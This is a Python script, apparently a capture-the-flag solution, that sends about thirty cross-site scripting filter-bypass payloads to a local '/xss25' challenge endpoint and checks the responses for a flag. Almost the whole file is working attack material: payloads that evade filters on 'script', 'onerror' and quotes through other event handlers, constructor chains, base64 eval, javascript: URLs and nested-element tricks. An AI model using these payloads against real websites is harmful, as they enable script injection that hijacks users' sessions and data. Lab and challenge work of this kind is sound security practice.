import requests
import re

base_url = "http://127.0.0.1:32911"
target_endpoint = "/xss25"

print("="*80)
print("TESTING FILTER BYPASSES FOR XSS25")
print("="*80)

# Based on discovery:
# - Server executes JavaScript
# - Blocks: 'script', 'onerror', single quotes
# - Need to execute: alert("XSS") or equivalent

bypass_payloads = [
    # Double quotes instead of single quotes
    ('alert("XSS")', 'double quotes'),
    ('alert(`XSS`)', 'template literals backticks'),
    
    # String.fromCharCode to avoid quotes
    ('alert(String.fromCharCode(88,83,83))', 'fromCharCode'),
    
    # Using eval with base64
    ('eval(atob("YWxlcnQoJ1hTUycp"))', 'base64 eval'),
    
    # Different event handlers (not onerror)
    ('<img src=x onload=alert("XSS")>', 'onload instead of onerror'),
    ('<body onload=alert("XSS")>', 'body onload'),
    ('<svg onload=alert("XSS")>', 'svg onload'),
    ('<input onfocus=alert("XSS") autofocus>', 'onfocus'),
    ('<marquee onstart=alert("XSS")>', 'onstart'),
    ('<video><source onerror=alert("XSS")></video>', 'source onerror'),
    ('<audio src=x onerror=alert("XSS")>', 'audio onerror'),
    
    # Using different tag names
    ('<div onmouseover=alert("XSS")>test</div>', 'onmouseover'),
    ('<details open ontoggle=alert("XSS")>', 'ontoggle'),
    ('<iframe onload=alert("XSS")>', 'iframe onload'),
    
    # JavaScript URL
    ('<a href=javascript:alert("XSS")>click</a>', 'javascript href'),
    
    # No tags, just JS execution
    ('setTimeout("alert(\\"XSS\\")")', 'setTimeout string'),
    ('setInterval("alert(\\"XSS\\")")', 'setInterval string'),
    
    # Constructor approach
    ('[].constructor.constructor("alert(\\"XSS\\")")()', 'constructor chain double quotes'),
    
    # Using with statement
    ('with(document)alert("XSS")', 'with statement'),
    
    # Location-based
    ('location="javascript:alert(\\"XSS\\")"', 'location redirect'),
    
    # Using toString
    ('alert((88).toString(16))', 'toString approach'),
    
    # Prototype pollution approach
    ('[]["find"]["constructor"]("alert(\\"XSS\\")")()', 'bracket notation constructor'),
    
    # Using Function constructor
    ('Function("alert(\\"XSS\\")")()', 'Function constructor'),
    
    # fetch + eval
    ('fetch("data:text/javascript,alert(\\"XSS\\")").then(r=>r.text().then(eval))', 'fetch data URI'),
    
    # Using Error
    ('onerror=alert;throw "XSS"', 'throw error'),
    
    # Using onmessage
    ('onmessage=alert;postMessage("XSS")', 'postMessage'),
    
    # SVG animate
    ('<svg><animate onbegin=alert("XSS")>', 'animate onbegin'),
    
    # Math element
    ('<math><mtext><table><mglyph><style><img src=x onerror=alert("XSS")>', 'math element'),
]

for payload, description in bypass_payloads:
    resp = requests.post(f"{base_url}{target_endpoint}", data={'solution': payload})
    print(f"\n[+] {description}")
    print(f"    Payload: {payload}")
    print(f"    Status: {resp.status_code} | Size: {len(resp.text)} bytes")
    
    # Extract the message from solution-text div
    match = re.search(r'<div class="solution-text">(.*?)</div>', resp.text, re.DOTALL)
    if match:
        message = match.group(1).strip()
        print(f"    Message: {message[:200]}")
        
        # Check for success indicators
        if 'Congratulations' in message or 'FLAG' in message or 'success' in message.lower():
            print(f"\n{'='*80}")
            print(f"[!!!] SUCCESS! FLAG OR CONGRATULATIONS FOUND!")
            print(f"{'='*80}")
            print(f"Full response:\n{resp.text}")
            break
        elif 'You did an alert' in message:
            print(f"    [!] PROGRESS: Alert execution detected!")
        elif "Sorry you can't use:" in message:
            blocked = re.search(r"Sorry you can't use: '([^']+)'", message)
            if blocked:
                print(f"    [X] Blocked: '{blocked.group(1)}'")

print("\n" + "="*80)
print("TESTING COMPLETE")
print("="*80)
